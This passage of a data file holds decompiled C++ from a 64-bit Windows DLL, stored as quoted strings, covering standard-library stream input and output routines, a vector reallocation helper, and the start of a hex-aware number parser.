    "  _QWORD pExceptionObject[5]; // [rsp+30h] [rbp-78h] BYREF",
    "  _QWORD v35[10]; // [rsp+58h] [rbp-50h] BYREF",
    "",
    "  v4 = a1 + *(int *)(*(_QWORD *)a1 + 4LL);",
    "  v5 = *(_DWORD *)(v4 + 16);",
    "  if ( v5 )",
    "  {",
    "    v6 = 4;",
    "    if ( *(_QWORD *)(v4 + 72) )",
    "      v6 = 0;",
    "    v7 = ((unsigned __int8)v5 | (unsigned __int8)v6) & 0x15 | 2;",
    "    *(_DWORD *)(v4 + 16) = v7;",
    "    v8 = *(_DWORD *)(v4 + 20) & v7;",
    "    if ( v8 )",
    "    {",
    "      if ( (v8 & 4) != 0 )",
    "      {",
    "        v28 = \"ios_base::badbit set\";",
    "      }",
    "      else",
    "      {",
    "        v28 = \"ios_base::failbit set\";",
    "        if ( (v8 & 2) == 0 )",
    "          v28 = \"ios_base::eofbit set\";",
    "      }",
    "      v29 = (__m128i *)unknown_libname_1(v32, 1);",
    "      sub_180001E10(pExceptionObject, (__int64)v28, v29);",
    "      throw (std::ios_base::failure *)pExceptionObject;",
    "    }",
    "    return 0;",
    "  }",
    "  v10 = *(_QWORD *)(v4 + 80);",
    "  if ( v10 )",
    "    sub_180009180(v10);",
    "  v11 = 0;",
    "  if ( a2 )",
    "    return *(_DWORD *)(*(int *)(*(_QWORD *)a1 + 4LL) + a1 + 16) == 0;",
    "  v12 = *(int *)(*(_QWORD *)a1 + 4LL);",
    "  if ( (*(_BYTE *)(v12 + a1 + 24) & 1) == 0 )",
    "    return *(_DWORD *)(*(int *)(*(_QWORD *)a1 + 4LL) + a1 + 16) == 0;",
    "  v33 = *(_QWORD *)(*(_QWORD *)(v12 + a1 + 64) + 8LL);",
    "  (*(void (**)(void))(*(_QWORD *)v33 + 8LL))();",
    "  v13 = sub_180009900((__int64)v32);",
    "  if ( v33 )",
    "  {",
    "    v14 = (void (__fastcall ***)(_QWORD, __int64))(*(__int64 (__fastcall **)(__int64))(*(_QWORD *)v33 + 16LL))(v33);",
    "    if ( v14 )",
    "      (**v14)(v14, 1);",
    "  }",
    "  v15 = *(_QWORD *)(*(int *)(*(_QWORD *)a1 + 4LL) + a1 + 72);",
    "  v16 = **(unsigned __int8 ***)(v15 + 56);",
    "  if ( v16 && **(int **)(v15 + 80) > 0 )",
    "    v17 = *v16;",
    "  else",
    "    v17 = (*(__int64 (__fastcall **)(__int64))(*(_QWORD *)v15 + 48LL))(v15);",
    "  while ( v17 != -1 )",
    "  {",
    "    if ( (*(_BYTE *)(*(_QWORD *)(v13 + 24) + 2LL * (unsigned __int8)v17) & 0x48) == 0 )",
    "      goto LABEL_31;",
    "    v18 = *(_QWORD *)(*(int *)(*(_QWORD *)a1 + 4LL) + a1 + 72);",
    "    if ( !**(_QWORD **)(v18 + 56) )",
    "    {",
    "LABEL_25:",
    "      v17 = (*(__int64 (__fastcall **)(__int64))(*(_QWORD *)v18 + 56LL))(v18);",
    "      goto LABEL_26;",
    "    }",
    "    v19 = *(int **)(v18 + 80);",
    "    if ( *v19 <= 1 )",
    "    {",
    "      if ( *v19 <= 0 )",
    "        goto LABEL_25;",
    "      --*v19;",
    "      v21 = *(_QWORD **)(v18 + 56);",
    "      v22 = (unsigned __int8 *)(*v21)++;",
    "      v17 = *v22;",
    "LABEL_26:",
    "      if ( v17 != -1 )",
    "      {",
    "        v23 = **(unsigned __int8 ***)(v18 + 56);",
    "        if ( v23 && **(int **)(v18 + 80) > 0 )",
    "          v17 = *v23;",
    "        else",
    "          v17 = (*(__int64 (__fastcall **)(__int64))(*(_QWORD *)v18 + 48LL))(v18);",
    "      }",
    "    }",
    "    else",
    "    {",
    "      --*v19;",
    "      v20 = *(_QWORD **)(v18 + 56);",
    "      v17 = *(unsigned __int8 *)++*v20;",
    "    }",
    "  }",
    "  v11 = 1;",
    "LABEL_31:",
    "  if ( v11 )",
    "  {",
    "    v24 = a1 + *(int *)(*(_QWORD *)a1 + 4LL);",
    "    v25 = 4;",
    "    if ( *(_QWORD *)(v24 + 72) )",
    "      v25 = 0;",
    "    v26 = (*(_DWORD *)(v24 + 16) | v25) & 0x14 | 3;",
    "    *(_DWORD *)(v24 + 16) = v26;",
    "    v27 = *(_DWORD *)(v24 + 20) & v26;",
    "    if ( v27 )",
    "    {",
    "      if ( (v27 & 4) != 0 )",
    "      {",
    "        v30 = \"ios_base::badbit set\";",
    "      }",
    "      else",
    "      {",
    "        v30 = \"ios_base::failbit set\";",
    "        if ( (v27 & 2) == 0 )",
    "          v30 = \"ios_base::eofbit set\";",
    "      }",
    "      v31 = (__m128i *)unknown_libname_1(v32, 1);",
    "      sub_180001E10(v35, (__int64)v30, v31);",
    "      throw (std::ios_base::failure *)v35;",
    "    }",
    "  }",
    "  return *(_DWORD *)(*(int *)(*(_QWORD *)a1 + 4LL) + a1 + 16) == 0;",
    "}",
    "",
    "",
    "__int64 __fastcall sub_18000CD60(int **a1)",
    "{",
    "  int *v2; // rcx",
    "  int v3; // eax",
    "  int *v4; // rax",
    "  __int64 result; // rax",
    "  int *v6; // rcx",
    "  unsigned __int8 *v7; // rdx",
    "  unsigned __int8 *v8; // rcx",
    "",
    "  if ( !*(_QWORD *)a1[7] )",
    "    goto LABEL_6;",
    "  v2 = a1[10];",
    "  v3 = *v2;",
    "  if ( *v2 > 1 )",
    "  {",
    "    *v2 = v3 - 1;",
    "    v4 = a1[7];",
    "    return *(unsigned __int8 *)++*(_QWORD *)v4;",
    "  }",
    "  if ( v3 > 0 )",
    "  {",
    "    *v2 = v3 - 1;",
    "    v6 = a1[7];",
    "    v7 = (unsigned __int8 *)(*(_QWORD *)v6)++;",
    "    result = *v7;",
    "  }",
    "  else",
    "  {",
    "LABEL_6:",
    "    result = (*((__int64 (__fastcall **)(int **))*a1 + 7))(a1);",
    "  }",
    "  if ( (_DWORD)result != -1 )",
    "  {",
    "    v8 = *(unsigned __int8 **)a1[7];",
    "    if ( v8 && *a1[10] > 0 )",
    "      return *v8;",
    "    else",
    "      return (*((__int64 (__fastcall **)(int **))*a1 + 6))(a1);",
    "  }",
    "  return result;",
    "}",
    "",
    "",
    "__int64 __fastcall sub_18000CE10(_QWORD *a1)",
    "{",
    "  _QWORD *v1; // rbx",
    "  __int64 result; // rax",
    "",
    "  v1 = (_QWORD *)*a1;",
    "  if ( *a1 )",
    "  {",
    "    sub_18001A2CC(v1[2]);",
    "    sub_18001A2CC(v1[4]);",
    "    return sub_18001A2CC(v1[5]);",
    "  }",
    "  return result;",
    "}",
    "",
    "",
    "__int64 __fastcall sub_18000CE50(__int64 a1, unsigned __int64 *a2, unsigned __int8 a3)",
    "{",
    "  int v3; // r15d",
    "  int v6; // ebx",
    "  char v7; // r14",
    "  __int64 v9; // rcx",
    "  _BYTE *v10; // rax",
    "  __int64 v11; // rcx",
    "  unsigned __int8 *v12; // rdx",
    "  int v13; // r9d",
    "  __int64 v14; // rcx",
    "  int *v15; // rdx",
    "  unsigned __int64 v16; // rcx",
    "  unsigned __int64 v17; // rdx",
    "  unsigned __int64 v18; // rax",
    "  __int64 v19; // rcx",
    "  int v20; // ebx",
    "  char v21; // al",
    "  int v22; // eax",
    "  int v23; // eax",
    "  __int64 v24; // rcx",
    "  const char *v26; // rbx",
    "  __m128i *v27; // rax",
    "  _QWORD v28[3]; // [rsp+30h] [rbp-78h] BYREF",
    "  _QWORD pExceptionObject[6]; // [rsp+50h] [rbp-58h] BYREF",
    "",
    "  v3 = a3;",
    "  v28[0] = a1;",
    "  v6 = 0;",
    "  v7 = 0;",
    "  v28[2] = a1;",
    "  v9 = *(_QWORD *)(*(int *)(*(_QWORD *)a1 + 4LL) + a1 + 72);",
    "  if ( v9 )",
    "    (*(void (__fastcall **)(__int64))(*(_QWORD *)v9 + 8LL))(v9);",
    "  if ( !sub_18000CAA0(a1, 1) )",
    "    goto LABEL_26;",
    "  a2[2] = 0;",
    "  v10 = a2;",
    "  if ( a2[3] > 0xF )",
    "    v10 = (_BYTE *)*a2;",
    "  *v10 = 0;",
    "  v11 = *(_QWORD *)(*(int *)(*(_QWORD *)a1 + 4LL) + a1 + 72);",
    "  v12 = **(unsigned __int8 ***)(v11 + 56);",
    "  if ( v12 && **(int **)(v11 + 80) > 0 )",
    "    v13 = *v12;",
    "  else",
    "    v13 = (*(__int64 (__fastcall **)(__int64))(*(_QWORD *)v11 + 48LL))(v11);",
    "  while ( 1 )",
    "  {",
    "    if ( v13 == -1 )",
    "    {",
    "      v6 = 1;",
    "      goto LABEL_25;",
    "    }",
    "    if ( v13 == v3 )",
    "      break;",
    "    v16 = a2[2];",
    "    if ( v16 >= 0x7FFFFFFFFFFFFFFFLL )",
    "    {",
    "      v6 = 2;",
    "      goto LABEL_25;",
    "    }",
    "    v17 = a2[3];",
    "    if ( v16 >= v17 )",
    "    {",
    "      sub_18000AD70(a2, 1u, 0, v13);",
    "    }",
    "    else",
    "    {",
    "      a2[2] = v16 + 1;",
    "      v18 = (unsigned __int64)a2;",
    "      if ( v17 > 0xF )",
    "        v18 = *a2;",
    "      *(_BYTE *)(v18 + v16) = v13;",
    "      *(_BYTE *)(v18 + v16 + 1) = 0;",
    "    }",
    "    v7 = 1;",
    "    v13 = sub_18000CD60(*(int ***)(*(int *)(*(_QWORD *)a1 + 4LL) + a1 + 72));",
    "  }",
    "  v7 = 1;",
    "  v14 = *(_QWORD *)(*(int *)(*(_QWORD *)a1 + 4LL) + a1 + 72);",
    "  if ( **(_QWORD **)(v14 + 56) && (v15 = *(int **)(v14 + 80), *v15 > 0) )",
    "  {",
    "    --*v15;",
    "    ++**(_QWORD **)(v14 + 56);",
    "  }",
    "  else",
    "  {",
    "    (*(void (__fastcall **)(__int64))(*(_QWORD *)v14 + 56LL))(v14);",
    "  }",
    "LABEL_25:",
    "  if ( !v7 )",
    "LABEL_26:",
    "    v6 |= 2u;",
    "  v19 = a1 + *(int *)(*(_QWORD *)a1 + 4LL);",
    "  v20 = *(_DWORD *)(v19 + 16) | v6;",
    "  v21 = 4;",
    "  if ( *(_QWORD *)(v19 + 72) )",
    "    v21 = 0;",
    "  v22 = ((unsigned __int8)v20 | (unsigned __int8)v21) & 0x17;",
    "  *(_DWORD *)(v19 + 16) = v22;",
    "  v23 = *(_DWORD *)(v19 + 20) & v22;",
    "  if ( v23 )",
    "  {",
    "    if ( (v23 & 4) != 0 )",
    "    {",
    "      v26 = \"ios_base::badbit set\";",
    "    }",
    "    else",
    "    {",
    "      v26 = \"ios_base::failbit set\";",
    "      if ( (v23 & 2) == 0 )",
    "        v26 = \"ios_base::eofbit set\";",
    "    }",
    "    v27 = (__m128i *)unknown_libname_1(v28, 1);",
    "    sub_180001E10(pExceptionObject, (__int64)v26, v27);",
    "    throw (std::ios_base::failure *)pExceptionObject;",
    "  }",
    "  v24 = *(_QWORD *)(*(int *)(*(_QWORD *)a1 + 4LL) + a1 + 72);",
    "  if ( v24 )",
    "    (*(void (__fastcall **)(__int64))(*(_QWORD *)v24 + 16LL))(v24);",
    "  return a1;",
    "}",
    "",
    "",
    "__int64 *__fastcall sub_18000D0A0(__int64 *a1, _BYTE *a2, unsigned __int64 a3)",
    "{",
    "  unsigned __int64 v3; // r14",
    "  _BYTE *v4; // r13",
    "  int v6; // edi",
    "  __int64 v7; // r9",
    "  __int64 v8; // rbx",
    "  unsigned __int64 v9; // rbx",
    "  __int64 v10; // rcx",
    "  __int64 v11; // rcx",
    "  __int64 v12; // rax",
    "  bool v13; // al",
    "  __int64 v14; // rax",
    "  char v15; // r14",
    "  __int64 v16; // rcx",
    "  _QWORD *v17; // rcx",
    "  int *v18; // rdx",
    "  _QWORD *v19; // rcx",
    "  int v20; // eax",
    "  __int64 v21; // rcx",
    "  bool v22; // zf",
    "  __int64 v23; // rcx",
    "  _QWORD *v24; // rcx",
    "  int *v25; // rdx",
    "  _QWORD *v26; // rcx",
    "  int v27; // eax",
    "  char *v28; // rcx",
    "  int v29; // edi",
    "  int v30; // r14d",
    "  int v31; // r14d",
    "  __int64 v32; // rcx",
    "  const char *v34; // rbx",
    "  __m128i *v35; // rax",
    "  char v36[16]; // [rsp+38h] [rbp-60h] BYREF",
    "  _QWORD pExceptionObject[5]; // [rsp+48h] [rbp-50h] BYREF",
    "",
    "  v3 = a3;",
    "  v4 = a2;",
    "  v6 = 0;",
    "  v7 = *(int *)(*a1 + 4);",
    "  v8 = *(__int64 *)((char *)a1 + v7 + 40);",
    "  if ( v8 <= 0 || v8 <= a3 )",
    "    v9 = 0;",
    "  else",
    "    v9 = v8 - a3;",
    "  v10 = *(__int64 *)((char *)a1 + v7 + 72);",
    "  if ( v10 )",
    "    (*(void (__fastcall **)(__int64))(*(_QWORD *)v10 + 8LL))(v10);",
    "  v11 = *a1;",
    "  v12 = *(int *)(*a1 + 4);",
    "  if ( *(_DWORD *)((char *)a1 + v12 + 16) )",
    "  {",
    "    v13 = 0;",
    "  }",
    "  else",
    "  {",
    "    v14 = *(__int64 *)((char *)a1 + v12 + 80);",
    "    if ( !v14 || (__int64 *)v14 == a1 )",
    "    {",
    "      v13 = 1;",
    "    }",
    "    else",
    "    {",
    "      sub_180009180(v14);",
    "      v11 = *a1;",
    "      v13 = *(_DWORD *)((char *)a1 + *(int *)(*a1 + 4) + 16) == 0;",
    "    }",
    "  }",
    "  if ( v13 )",
    "  {",
    "    if ( (*(_DWORD *)((_BYTE *)a1 + *(int *)(v11 + 4) + 24) & 0x1C0) != 0x40 )",
    "    {",
    "      while ( v9 )",
    "      {",
    "        v16 = *(int *)(*a1 + 4);",
    "        a3 = *((unsigned __int8 *)a1 + v16 + 88);",
    "        v17 = *(_QWORD **)((char *)a1 + v16 + 72);",
    "        if ( *(_QWORD *)v17[8] && (v18 = (int *)v17[11], *v18 > 0) )",
    "        {",
    "          --*v18;",
    "          v19 = (_QWORD *)v17[8];",
    "          a2 = (_BYTE *)(*v19)++;",
    "          *a2 = a3;",
    "          v20 = a3;",
    "        }",
    "        else",
    "        {",
    "          v20 = (*(__int64 (__fastcall **)(_QWORD *, _QWORD))(*v17 + 24LL))(v17, (unsigned int)a3);",
    "        }",
    "        if ( v20 == -1 )",
    "        {",
    "          v15 = 4;",
    "          v6 = 4;",
    "          goto LABEL_25;",
    "        }",
    "        --v9;",
    "      }",
    "    }",
    "    v21 = *(__int64 *)((char *)a1 + *(int *)(*a1 + 4) + 72);",
    "    v22 = (*(__int64 (__fastcall **)(__int64, _BYTE *, unsigned __int64))(*(_QWORD *)v21 + 72LL))(v21, v4, v3) == v3;",
    "    v15 = 4;",
    "    if ( v22 )",
    "    {",
    "LABEL_25:",
    "      while ( v9 )",
    "      {",
    "        v23 = *(int *)(*a1 + 4);",
    "        a3 = *((unsigned __int8 *)a1 + v23 + 88);",
    "        v24 = *(_QWORD **)((char *)a1 + v23 + 72);",
    "        if ( *(_QWORD *)v24[8] && (v25 = (int *)v24[11], *v25 > 0) )",
    "        {",
    "          --*v25;",
    "          v26 = (_QWORD *)v24[8];",
    "          a2 = (_BYTE *)(*v26)++;",
    "          *a2 = a3;",
    "          v27 = a3;",
    "        }",
    "        else",
    "        {",
    "          v27 = (*(__int64 (__fastcall **)(_QWORD *, _QWORD))(*v24 + 24LL))(v24, (unsigned int)a3);",
    "        }",
    "        if ( v27 == -1 )",
    "          goto LABEL_32;",
    "        --v9;",
    "      }",
    "    }",
    "    else",
    "    {",
    "LABEL_32:",
    "      v6 |= 4u;",
    "    }",
    "    *(__int64 *)((char *)a1 + *(int *)(*a1 + 4) + 40) = 0;",
    "  }",
    "  else",
    "  {",
    "    v15 = 4;",
    "    v6 = 4;",
    "  }",
    "  v28 = (char *)a1 + *(int *)(*a1 + 4);",
    "  v29 = *((_DWORD *)v28 + 4) | v6;",
    "  if ( *((_QWORD *)v28 + 9) )",
    "    v15 = 0;",
    "  v30 = ((unsigned __int8)v29 | (unsigned __int8)v15) & 0x17;",
    "  *((_DWORD *)v28 + 4) = v30;",
    "  v31 = *((_DWORD *)v28 + 5) & v30;",
    "  if ( v31 )",
    "  {",
    "    if ( (v31 & 4) != 0 )",
    "    {",
    "      v34 = \"ios_base::badbit set\";",
    "    }",
    "    else",
    "    {",
    "      v34 = \"ios_base::failbit set\";",
    "      if ( (v31 & 2) == 0 )",
    "        v34 = \"ios_base::eofbit set\";",
    "    }",
    "    v35 = (__m128i *)unknown_libname_1(v36, 1);",
    "    sub_180001E10(pExceptionObject, (__int64)v34, v35);",
    "    throw (std::ios_base::failure *)pExceptionObject;",
    "  }",
    "  if ( !(unsigned __int8)sub_180010AB0(v28, a2, a3, v7) )",
    "    sub_1800092E0(a1);",
    "  v32 = *(__int64 *)((char *)a1 + *(int *)(*a1 + 4) + 72);",
    "  if ( v32 )",
    "    (*(void (__fastcall **)(__int64))(*(_QWORD *)v32 + 16LL))(v32);",
    "  return a1;",
    "}",
    "",
    "",
    "__int64 __fastcall sub_18000D360(__int64 a1, _QWORD *a2, __int64 a3)",
    "{",
    "  unsigned __int64 v5; // rsi",
    "  __int64 v6; // rax",
    "  unsigned __int64 v7; // r12",
    "  unsigned __int64 v8; // rcx",
    "  unsigned __int64 v9; // rax",
    "  unsigned __int64 v10; // rcx",
    "  unsigned __int64 v11; // r13",
    "  unsigned __int64 v12; // rdi",
    "  __int64 v13; // rax",
    "  __int64 *v14; // rsi",
    "  _QWORD *v15; // r8",
    "  _QWORD *v16; // rax",
    "  __int64 *v17; // rcx",
    "  _QWORD *v18; // rdx",
    "  unsigned __int64 v19; // r9",
    "  __int64 *v20; // rdx",
    "  unsigned __int64 v21; // r8",
    "  _QWORD *v22; // rcx",
    "  unsigned __int64 v23; // rdx",
    "  _QWORD *v24; // r8",
    "  _QWORD *v25; // rdx",
    "  __int64 v26; // rcx",
    "  __int64 *v27; // rcx",
    "  unsigned __int64 v28; // rdx",
    "  __int64 v30; // [rsp+20h] [rbp-68h]",
    "  __int64 v31; // [rsp+28h] [rbp-60h]",
    "",
    "  v30 = a3;",
    "  v5 = (unsigned __int64)a2 - *(_QWORD *)a1;",
    "  v6 = (__int64)(*(_QWORD *)(a1 + 8) - *(_QWORD *)a1) >> 5;",
    "  if ( v6 == 0x7FFFFFFFFFFFFFFLL )",
    "    std::vector<void *>::_Xlen();",
    "  v7 = v6 + 1;",
    "  v8 = (__int64)(*(_QWORD *)(a1 + 16) - *(_QWORD *)a1) >> 5;",
    "  if ( v8 > 0x7FFFFFFFFFFFFFFLL - (v8 >> 1) )",
    "    goto LABEL_32;",
    "  v9 = (v8 >> 1) + v8;",
    "  v10 = v7;",
    "  if ( v9 >= v7 )",
    "    v10 = v9;",
    "  if ( v10 > 0x7FFFFFFFFFFFFFFLL )",
    "    goto LABEL_32;",
    "  v11 = 32 * v10;",
    "  if ( !(32 * v10) )",
    "  {",
    "    v12 = 0;",
    "    goto LABEL_14;",
    "  }",
    "  if ( v11 >= 0x1000 )",
    "  {",
    "    if ( v11 + 39 >= v11 )",
    "    {",
    "      v13 = sub_180011714(v11 + 39);",
    "      if ( !v13 )",
    "        goto LABEL_34;",
    "      v12 = (v13 + 39) & 0xFFFFFFFFFFFFFFE0uLL;",
    "      *(_QWORD *)(v12 - 8) = v13;",
    "      goto LABEL_13;",
    "    }",
    "LABEL_32:",
    "    Concurrency::cancel_current_task();",
    "  }",
    "  v12 = sub_180011714(32 * v10);",
    "LABEL_13:",
    "  a3 = v30;",
    "LABEL_14:",
    "  v31 = (v5 & 0xFFFFFFFFFFFFFFE0uLL) + v12;",
    "  v14 = (__int64 *)(v31 + 32);",
    "  sub_180006D30(v31, a3);",
    "  v15 = *(_QWORD **)(a1 + 8);",
    "  v16 = *(_QWORD **)a1;",
    "  if ( a2 == v15 )",
    "  {",
    "    v17 = (__int64 *)v12;",
    "    if ( v16 != v15 )",
    "    {",
    "      v18 = v16 + 3;",
    "      v19 = v12 - (_QWORD)v16;",
    "      do",
    "      {",
    "        *(_OWORD *)v17 = 0;",
    "        *(_QWORD *)((char *)v18 + v19 - 8) = 0;",
    "        *(_QWORD *)((char *)v18 + v19) = 0;",
    "        *(_OWORD *)v17 = *(_OWORD *)(v18 - 3);",
    "        *((_OWORD *)v17 + 1) = *(_OWORD *)(v18 - 1);",
    "        *(v18 - 1) = 0;",
    "        *v18 = 15;",
    "        *((_BYTE *)v18 - 24) = 0;",
    "        v17 += 4;",
    "        v18 += 4;",
    "      }",
    "      while ( v18 - 3 != v15 );",
    "    }",
    "    v20 = v17;",
    "  }",
    "  else",
    "  {",
    "    v21 = v12;",
    "    if ( v16 != a2 )",
    "    {",
    "      v22 = v16 + 3;",
    "      v23 = v12 - (_QWORD)v16;",
    "      do",
    "      {",
    "        *(_OWORD *)v21 = 0;",
    "        *(_QWORD *)((char *)v22 + v23 - 8) = 0;",
    "        *(_QWORD *)((char *)v22 + v23) = 0;",
    "        *(_OWORD *)v21 = *(_OWORD *)(v22 - 3);",
    "        *(_OWORD *)(v21 + 16) = *(_OWORD *)(v22 - 1);",
    "        *(v22 - 1) = 0;",
    "        *v22 = 15;",
    "        *((_BYTE *)v22 - 24) = 0;",
    "        v21 += 32LL;",
    "        v22 += 4;",
    "      }",
    "      while ( v22 - 3 != a2 );",
    "    }",
    "    sub_18000ACE0((__int64 *)v21, (__int64 *)v21);",
    "    v24 = *(_QWORD **)(a1 + 8);",
    "    if ( a2 != v24 )",
    "    {",
    "      v25 = a2 + 3;",
    "      v26 = v31 - (_QWORD)a2;",
    "      do",
    "      {",
    "        *(_OWORD *)v14 = 0;",
    "        *(_QWORD *)((char *)v25 + v26 + 24) = 0;",
    "        *(_QWORD *)((char *)v25 + v26 + 32) = 0;",
    "        *(_OWORD *)v14 = *(_OWORD *)(v25 - 3);",
    "        *((_OWORD *)v14 + 1) = *(_OWORD *)(v25 - 1);",
    "        *(v25 - 1) = 0;",
    "        *v25 = 15;",
    "        *((_BYTE *)v25 - 24) = 0;",
    "        v14 += 4;",
    "        v25 += 4;",
    "      }",
    "      while ( v25 - 3 != v24 );",
    "    }",
    "    v20 = v14;",
    "    v17 = v14;",
    "  }",
    "  sub_18000ACE0(v17, v20);",
    "  if ( *(_QWORD *)a1 )",
    "  {",
    "    sub_18000ACE0(*(__int64 **)a1, *(__int64 **)(a1 + 8));",
    "    v27 = *(__int64 **)a1;",
    "    v28 = (*(_QWORD *)(a1 + 16) - *(_QWORD *)a1) & 0xFFFFFFFFFFFFFFE0uLL;",
    "    if ( v28 < 0x1000 )",
    "    {",
    "LABEL_30:",
    "      sub_1800116E0(v27, v28);",
    "      goto LABEL_31;",
    "    }",
    "    v28 += 39LL;",
    "    if ( (unsigned __int64)v27 - *(v27 - 1) - 8 <= 0x1F )",
    "    {",
    "      v27 = (__int64 *)*(v27 - 1);",
    "      goto LABEL_30;",
    "    }",
    "LABEL_34:",
    "    invalid_parameter_noinfo_noreturn();",
    "  }",
    "LABEL_31:",
    "  *(_QWORD *)a1 = v12;",
    "  *(_QWORD *)(a1 + 8) = v12 + 32 * v7;",
    "  *(_QWORD *)(a1 + 16) = v12 + v11;",
    "  return v31;",
    "}",
    "",
    "",
    "__int64 __fastcall sub_18000D640(char *a1, __int64 *a2, __int64 a3, __int16 a4, __int64 a5)",
    "{",
    "  __int64 v9; // rdi",
    "  char v10; // di",
    "  __int64 v11; // rax",
    "  __int64 v12; // rcx",
    "  unsigned __int8 *v13; // rdx",
    "  int v14; // eax",
    "  __int64 v15; // rcx",
    "  int *v16; // rdx",
    "  unsigned __int8 **v17; // rcx",
    "  unsigned __int8 *v18; // rdx",
    "  int v19; // eax",
    "  char v20; // al",
    "  __int64 v21; // rcx",
    "  unsigned __int8 *v22; // rdx",
    "  int v23; // eax",
    "  char v24; // al",
    "  __int64 v25; // rcx",
    "  int *v26; // rdx",
    "  unsigned __int8 **v27; // rcx",
    "  unsigned __int8 *v28; // rdx",
    "  int v29; // eax",
    "  __int64 v30; // rcx",
    "  int *v31; // rdx",
    "  unsigned __int8 **v32; // rcx",
    "  unsigned __int8 *v33; // rdx",
    "  int v34; // eax",
    "  __int64 v35; // rcx",
    "  unsigned __int8 *v36; // rdx",
    "  int v37; // eax",
    "  __int64 v38; // rcx",
    "  int *v39; // rdx",
    "  unsigned __int8 **v40; // rcx",
    "  unsigned __int8 *v41; // rdx",
    "  int v42; // eax",
    "  char v43; // al",
    "  int v44; // r14d",
    "  unsigned __int8 v45; // r13",
    "  char v46; // di",
    "  __int64 v47; // rcx",
    "  unsigned __int8 *v48; // rdx",
    "  int v49; // eax",
    "  __int64 v50; // rcx",
    "  int *v51; // rdx",
    "  unsigned __int8 **v52; // rcx",
    "  unsigned __int8 *v53; // rdx",
    "  int v54; // eax",
    "  char v55; // al",
    "  __int64 v56; // rcx",
    "  unsigned __int8 *v57; // rdx",
    "  int v58; // eax",
    "  char v59; // al",
    "  __int64 v60; // rcx",
    "  int *v61; // rdx",
    "  unsigned __int8 **v62; // rcx",
    "  unsigned __int8 *v63; // rdx",
    "  int v64; // eax",
    "  unsigned __int64 v65; // r12",
    "  __int64 v66; // rdi",
    "  char *v67; // r15",
    "  char v68; // al",
    "  unsigned __int64 v69; // rsi",
    "  unsigned __int64 v70; // r14",
    "  __int64 v71; // rcx",
    "  unsigned __int8 *v72; // rdx",
    "  int v73; // eax",
    "  unsigned __int64 v74; // rax",
    "  char v75; // al",
    "  unsigned __int64 *v76; // rax",
    "  unsigned __int64 *v77; // rax",
    "  __int64 v78; // rcx",
    "  unsigned __int8 *v79; // rdx",
    "  int v80; // eax",
    "  unsigned __int64 *v81; // rax",
    "  unsigned __int64 v82; // rcx",
    "  unsigned __int64 *v83; // rax",
    "  __int64 v84; // rcx",
    "  int *v85; // rdx",
    "  unsigned __int8 **v86; // rcx",
    "  unsigned __int8 *v87; // rdx",
    "  int v88; // eax",
    "  char v89; // al",
    "  unsigned __int64 *v90; // rax",
    "  unsigned __int8 v91; // r15",
    "  __int64 v92; // r13",
    "  __int64 v93; // rcx",
    "  unsigned __int8 *v94; // rdx",
    "  int v95; // eax",
    "  __int64 v96; // rcx",
    "  int *v97; // rdx",
    "  unsigned __int8 **v98; // rcx",
    "  unsigned __int8 *v99; // rdx",
    "  int v100; // eax",
    "  char v101; // al",
    "  char *v102; // rcx",
    "  __int64 v103; // r8",
    "  unsigned __int64 v104; // r10",
    "  char *v105; // r9",
    "  char v106; // dl",
    "  unsigned __int64 *v107; // rax",
    "  unsigned __int64 *v108; // rax",
    "  char *v109; // rax",
    "  unsigned __int16 v110; // bx",
    "  unsigned __int64 v111; // rdx",
    "  unsigned __int64 v112; // rax",
    "  unsigned __int64 v113; // rdx",
    "  __int64 v114; // rax",
    "  char v116; // [rsp+20h] [rbp-61h]",
    "  char v117; // [rsp+21h] [rbp-60h]",
    "  char v118; // [rsp+22h] [rbp-5Fh]",
    "  char v119; // [rsp+23h] [rbp-5Eh]",
    "  char v120; // [rsp+24h] [rbp-5Dh]",
    "  char *v121; // [rsp+28h] [rbp-59h]",
    "  __int64 v122; // [rsp+30h] [rbp-51h]",
    "  unsigned __int64 v123[2]; // [rsp+38h] [rbp-49h] BYREF",
    "  unsigned __int64 v124; // [rsp+48h] [rbp-39h]",
    "  unsigned __int64 v125; // [rsp+50h] [rbp-31h]",
    "  _QWORD v126[2]; // [rsp+58h] [rbp-29h] BYREF",
    "  __int64 v127; // [rsp+68h] [rbp-19h]",
    "  unsigned __int64 v128; // [rsp+70h] [rbp-11h]",
    "  _BYTE v129[26]; // [rsp+78h] [rbp-9h] BYREF",
    "  char v130[6]; // [rsp+92h] [rbp+11h] BYREF",
    "",
    "  v122 = a3;",
    "  v9 = sub_18000ABA0(a5);",
    "  (*(void (__fastcall **)(__int64, _QWORD *))(*(_QWORD *)v9 + 40LL))(v9, v126);",
    "  if ( v127 )",
    "    v10 = (*(__int64 (__fastcall **)(__int64))(*(_QWORD *)v9 + 32LL))(v9);",
    "  else",
    "    v10 = 0;",
    "  v119 = v10;",
    "  v11 = sub_180009900(a5);",
    "  (*(void (__fastcall **)(__int64, const char *, void *, _BYTE *))(*(_QWORD *)v11 + 56LL))(",
    "    v11,",
    "    \"0123456789ABCDEFabcdef-+Xx\",",
    "    &unk_180044A63,",
    "    v129);",
    "  v116 = 0;",
    "  if ( v10 && !(unsigned __int8)sub_18000E050(a2, a3) )",
    "  {",
    "    do",
    "    {",
    "      if ( !*((_BYTE *)a2 + 8) )",
    "      {",
    "        v12 = *a2;",
    "        if ( !*a2",
    "          || ((v13 = **(unsigned __int8 ***)(v12 + 56)) == 0 || **(int **)(v12 + 80) <= 0",
    "            ? (v14 = (*(__int64 (__fastcall **)(__int64))(*(_QWORD *)v12 + 48LL))(v12))",
    "            : (v14 = *v13),",
    "              v14 == -1) )",
    "        {",
    "          *a2 = 0;",
    "        }",
    "        else",
    "        {",
    "          *((_BYTE *)a2 + 9) = v14;",
    "        }",
    "        *((_BYTE *)a2 + 8) = 1;",
    "      }",
    "      if ( *((_BYTE *)a2 + 9) != v10 )",
    "        break;",
    "      v15 = *a2;",
    "      if ( !*a2",
    "        || (!**(_QWORD **)(v15 + 56) || (v16 = *(int **)(v15 + 80), *v16 <= 0)",
    "          ? (v19 = (*(__int64 (__fastcall **)(__int64))(*(_QWORD *)v15 + 56LL))(v15))",
    "          : (--*v16, v17 = *(unsigned __int8 ***)(v15 + 56), v18 = *v17, ++*v17, v19 = *v18),",
    "            v19 == -1) )",
    "      {",
    "        *a2 = 0;",
    "        v20 = 1;",
    "      }",
    "      else",
    "      {",
    "        v20 = 0;",
    "      }",
    "      *((_BYTE *)a2 + 8) = v20;",
    "      v116 = 1;",
    "    }",
    "    while ( !(unsigned __int8)sub_18000E050(a2, a3) );",
    "  }",
    "  v121 = a1;",
